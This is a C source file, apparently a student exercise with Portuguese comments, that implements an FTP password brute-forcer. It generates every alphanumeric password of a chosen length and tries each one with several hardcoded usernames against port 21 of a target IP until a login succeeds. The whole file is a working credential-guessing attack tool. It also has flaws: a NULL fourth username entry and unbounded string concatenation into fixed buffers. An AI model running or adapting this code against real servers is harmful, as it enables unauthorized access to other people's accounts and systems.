#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <math.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <termios.h>
#include <fcntl.h>
#include <arpa/inet.h>

#define TAM_KEY 62
#define TAM_LOGIN 4

#define TRUE 1
#define FALSE 0

//encontra a próxima sequencia somando um
//se o próximo número for maior que o vetor, retorna FALSE
//ex: para n= 3, m = 2 
//o próximo de 001 é 010
int proxima(int seq[], int n, int m) {
    int i = n-1;
    while (i>= 0) {
        seq[i] = (seq[i] +1) % m;
        if (seq[i] == 0) 
        	i--;
        else 
        	return TRUE;
     }
     return FALSE;
}


void keyGenerator(unsigned int len){
    FILE *output;

	int i;
    char c;
    
	int n = len;//numero de caracteres ou posições de uma sequencia
	int m = TAM_KEY; //numero total de elementos, objetos

	int seq[n+1];
	char password[n+1];
	//cria o vetor de objetos
	char objetos[m];

	i=0;
	for (c='A';c<='Z';c++){
		objetos[i]=c;
		i++;
	}
	for (c='a';c<='z';c++){
		objetos[i]=c;
		i++;
	}
	for (c='0';c<='9';c++){
		objetos[i]=c;
		i++;
	}


    output = fopen("chaves.txt","w+");
    if(output == NULL){
        printf("Erro, Nao foi possivel criar o arquivo de saida\n");
        exit(0);
    }

	//para enumerar todas as sequencias usa-se o algoritmo explicado em:
	//http://www.ime.usp.br/~mms/mac1222s2013/19%20-%20algoritmos%20de%20enumeracao.pdf
	//primeiro cria uma sequencia númerica com n posicoes e m possíveis digitos, de 0 até m-1
	//encontra-se a próxima sequencia somando 1, repete até encontrar todas sequencias
	//ex: n=3 e m=2: começa de 000, e soma 1: 001, 010, até o último 111
	
	//antes de usar o md5 converte-se a sequencia numerica na sequencia de objetos ou letras
	
	//cria a primeira sequencia
	for (i=0; i<n; i++) 
    	seq[i] = 0;
    
    do {      
       	//converte a sequencia numerica na sequencia de letras
       	for (i=0; i<n;i++)
       		password[i]=objetos[seq[i]];
        	password[i]='\0';
        	
        	fprintf(output, "%s\n", password);

    	//gera a próxima sequencia
   	} while (proxima(seq, n, m));
	

    fclose(output);
}

int match(char *username, char *password, char *ip){
    char buffer[1024];
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char quit[10] = "QUIT\n";
    char error = '5';
    int sock = 0, achou = 0;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        perror("");
        exit(1);
    }
    
    memset(&server, '0', sizeof(server));
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(21);

    printf("\nConectando:\n");
    if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
        perror("");
        exit(1);
    }

    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);

    printf("resp: %s\n",buffer);
    
    printf("enviando usuario: %s\n",username);
    //Enviado nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);
    strcat(user, "\n");
    send(sock, user, strlen(user), 0);

    //Resposta nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    
    printf("resp: %s\n",buffer);
    printf("enviando senha: %s\n",password);   
    
    //Enviado nome do pass
    memset(buffer, '0', 1024);
    strcat(pass, password);
    strcat(pass, "\n");
    send(sock, pass, strlen(pass), 0);

    //Resposta nome do pass
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    
    printf("resp: %s\n",buffer);
    
    //esse sleep é necessário?
    sleep(5);
    
    if(buffer[0] != error){
        achou = 1;
    }
    
    printf("enviando QUIT\n");
    //Enviando comando 'QUIT'
    memset(buffer, '0', 1024);
    send(sock, quit, strlen(quit), 0);
    
    //Resposta do 'QUIT'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("resp: %s", buffer);

    if(sock >= 0){
        close(sock);
    }

    return achou;
}

int bruteforce(unsigned int lenKey, char *ip, char *username, char *password){
    char *login[TAM_LOGIN] = {"usuario", "kath", "teste"};
    char pass[256];
    int i = 0, result = 0, achou = 0;
    FILE *file;
    
    keyGenerator(lenKey);
    
    file = fopen("chaves.txt","r");
    if(file == NULL){
        printf("Erro, Nao foi possivel criar o arquivo de saida\n");
        exit(0);
    }
    
    for(i = 0; i < TAM_LOGIN && !achou; i++){
        while(!feof(file) && !achou){
            fscanf(file, " %s", pass);

            result = match(login[i], pass, ip);
            if(result){
                strcpy(username, login[i]);
                strcpy(password, pass);
                achou = 1;
            }
        }
        rewind(file);
    }

    if(achou == 0){
        printf("Nao foi encontrado uma combinacao de usuario e senha.\n");
        return(EXIT_FAILURE);
    }
    
    return EXIT_SUCCESS;
}
